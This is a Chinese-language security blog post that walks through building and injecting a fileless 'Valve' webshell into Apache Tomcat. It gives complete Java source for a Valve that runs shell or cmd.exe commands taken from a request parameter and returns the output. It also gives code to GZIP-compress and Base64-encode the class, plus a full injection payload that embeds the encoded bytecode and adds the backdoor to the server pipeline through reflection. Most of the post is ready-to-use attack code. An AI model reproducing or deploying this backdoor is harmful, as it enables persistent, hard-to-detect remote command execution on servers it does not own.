---
typora-root-url: ../../../static
title: "Tomcat之Valve内存马"
date: 2021-06-02T17:07:36+08:00
draft: false
categories: ["security"]
---

## 前置知识
需要掌握[《Tomcat架构原理》][l1]。

这一招是真的厉害，脑袋一拍，我咋没想到？直接在Pipeline-Valve内植入木马，简单粗暴，非常好用。

## POC构建
首先创建一个Valve马，代码如下：

	public class StandardContextsValve extends ValveBase {
	    @Override
	    public void invoke(Request request, Response response) throws IOException, ServletException {
	        HttpServletRequest req = (HttpServletRequest) request;
	        HttpServletResponse resp = (HttpServletResponse) response;
	        String cmd=req.getParameter("p1n93r");
	        if ( cmd!= null&&!"".equals(cmd)) {
	            boolean isLinux = true;
	            String osTyp = System.getProperty("os.name");
	            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
	                isLinux = false;
	            }
	            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
	            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
	            Scanner s = new Scanner(in).useDelimiter("\\A");
	            String output = s.hasNext() ? s.next() : "";
	            resp.getWriter().write(output);
	            resp.getWriter().flush();
	        }
	        this.getNext().invoke(request, response);
	    }
	}

然后得到Valve马的压缩后的字节码：

    public static void main(String[] args) throws IOException {
        InputStream in = Test.class.getClassLoader().getResourceAsStream("StandardContextsValve.class");
        byte[] bytes = new byte[in.available()];
        in.read(bytes);
        // 将字节压缩下
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        GZIPOutputStream gzipOutputStream=new GZIPOutputStream(byteArrayOutputStream);
        gzipOutputStream.write(bytes);
        gzipOutputStream.close();
        System.out.println(java.util.Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray()));
    }

最后给出整体的POC：

	java.lang.ClassLoader classLoader = (java.lang.ClassLoader) Thread.currentThread().getContextClassLoader();
	java.lang.reflect.Method defineClass = java.lang.ClassLoader.class.getDeclaredMethod("defineClass",new Class[] {byte[].class, int.class, int.class});
	defineClass.setAccessible(true);
	// 这是经过GZIP压缩后的恶意Vavle的字节码
	String evalBase64 = "H4sIAAAAAAAAAI1WWXMTRxD+RtesVwsGGdvIXHHCIRvwhkBIkAgJmDOxDbGIiYEc4/VgLUi7YndlG8hF7oOc5DKpykseqMpbqlICQoXwxEP+SP4FpGclQMaisKs8R/dM99fd3/Tq39t/3QCwBb/oWIVBDUNJHMQhDS/rSGJYQ17HYbyiNiMajqj5VY5RDUc1HNNwXMNrOl7HG2p4U4fAGIelow3jGqSaT6hhQg2FJGyc1HEKRTWUdKyEk4SLMsdpDo8hsd127GAHQzTTM8IQ63fHJUPrgO3IoUppTHqHxViRJKkB1xLFEeHZal8XxoKC7TN0DuQD4YwLb7zfdQI5Hfgjojgpc2TddibdU3RyODPgehOmKAurIE1LBKJoO8K0XMeRVuB65rA8XZF+kHvkMb/sOr7MKbDc9glnZZqBHWWIu/7hM2WF9KSYFGZROBNmPvBsZ4KAxKzSOCFtO9ZMGbEdhvaaxnbNA065EpBSihIpmbpW01UCu2jmLUFgPBWcWwnoJOHwauAZ1s0zSgbNq0fC8OjU1GOmIpEn5UXBmTZ96U0WZWAWgqBs7qchXxPc9xJTXpSHR12474ESxbCACmqdGhTlsNAhV3yOgKPCMUlc5OjjmCLaMeh7pi1ZDmy6zzHNcYZh0aAMCu74IeGJkgykRxnU827Fs+ReW9Gmqyld+hRGA4+hm1Jb3uRs2+yRPwNncY4BBt7C25Rq1+9zyCrHOwbexTkD7+E8oZ6yHQPv4wNy/mCBqb5+gYaNBJZTdH1ymjBETIvjQwMf4WMDn+BTjs8MfI4vGBbPqbUCdYGuHN9p4Et8ZeBrfGPgW5ynZBj4Dhc5vjfwA3408BO6DfyMGY5LBtYhQ7xqGizD6mZFn1Q63wyP7BKKHGvmRSiGtfPjEBmcF3fI4PwoQ4+jybtplB68RxCGlbON1m01HDAmZHCPNwQiM/e99jR7wgmCLYpEtPbGGwfHTlL4uZ6js2lxxg8kQUwqX55bll5ApE0G7oA7Jb3+MO1LMk3daJTRQNgOOVrW6Ki/ILy8ypxjydDd4vu64YoT2CWyqZO/e5v2WQ7qYvViiZ1E1EymSadqvEHALen7uVmu6kKGheRqVjk677qb09+WZpoqVH81Kr7cLYt2yQ6Lse7hxXigM/KC8IeI6+FXhbIRc8JNC6E64tWMNQI6RKbqilwDcxrE1N2n1OKB+t4FQVjjJ4oV9cw5+ai5XkEemj2Ku9+m9EOV6KbP5CqovwiY6kg0Pk47k2bqRYj3XgH7I1Q/QWMiFC7Caqg+FR7AGqylmakegKi6zP5DjLTAzfVDG7KxjanINUQjyMbT8Vv4LRVLx6uIX8JMbGsilbgKnuVpfgttaV6FlmqpQp9BIro10Z6YQTrxN5Kj0ZSRH42lFuRHyUT+Mjrq0oVK2lqTZrWrWJTWqlhcRSrbch1to+mWK1iSaq+iI6un9So6Z5BU89LLiKdi2WQ6dg1pyk6yiq76uoplvVUsX7/hGlZEoeKOhnHvophBvzIiWEIRt6MVHZS4TkrXUoo6jSy68ByWo4QV1MVXUntdhV8pnb/TiT/Jwj+UMZWzs5SXblxED3oplxlcwHpsAKd7+7ARfdDoRJaS/yRayEYvNuEp6GSpA5vpXFLltJ5vtdqCp8Ma3MRWPEPYIriBZ7GNMMdxnezkqA6tFMV2uhsnfMAgEndooXHs4Hie4wWOnRy7OPoZ/QNdwxy7b6tP3m6OPRx7Sdt/hwJNzL1B5vaFlIhgPw7gRVq3RAgTCI3iw0shawb+B6kuAzUECgAA";
	byte[] evalBytes = java.util.Base64.getDecoder().decode(evalBase64);
	java.io.ByteArrayInputStream byteInputStream = new java.io.ByteArrayInputStream(evalBytes);
	java.io.ByteArrayOutputStream byteOutputStream = new java.io.ByteArrayOutputStream();
	java.util.zip.GZIPInputStream gzipInputStream = new java.util.zip.GZIPInputStream(byteInputStream);
	byte[] buffer = new byte[1024];
	for (int i=-1;(i=gzipInputStream.read(buffer)) >0;){
		byteOutputStream.write(buffer,0,i);
	}
	byte[] bytes = byteOutputStream.toByteArray();
	// 先加载Vavle内存马类定义
	defineClass.invoke(classLoader, new Object[] {bytes, 0, bytes.length});
	org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
	org.apache.catalina.webresources.StandardRoot standardroot = (org.apache.catalina.webresources.StandardRoot) webappClassLoaderBase.getResources();
	org.apache.catalina.core.StandardContext standardContext = (org.apache.catalina.core.StandardContext)standardroot.getContext();
	// 实例化Valve内存马
	org.apache.catalina.valves.ValveBase evalValve=(org.apache.catalina.valves.ValveBase)Class.forName("StandardContextsValve").newInstance();
	// 然后直接通过StandardContext获取当前容器的Pipeline，往里面添加Valve内存马即可
	standardContext.getPipeline().addValve(evalValve);

内存中发现已经注入了Valve内存马：

![Valve内存马][p1]

效果如下所示：

![Valve内存马效果][p2]





[l1]:https://p1n93r.github.io/post/java/tomcat%E6%9E%B6%E6%9E%84%E5%8E%9F%E7%90%86/

[p1]:/media/2021-06-02-06.png
[p2]:/media/2021-06-02-07.png